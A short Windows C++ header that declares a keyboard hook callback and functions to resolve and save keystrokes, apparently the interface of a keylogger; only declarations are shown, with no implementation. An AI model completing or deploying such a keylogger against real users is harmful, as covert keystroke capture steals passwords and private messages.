#pragma once
#include <Windows.h>
// #include <queue>
#include <cstdio>
#include <iostream>
#include <fstream>
#include <sstream>
#include <ctime>
#include <string>

using namespace std;

int save_keystroke(int kb_code);
LRESULT __stdcall kb_callback(int kb_code, WPARAM w_param, LPARAM l_param);
string resolve_keystroke(int kb_code, HKL keyboard_layout);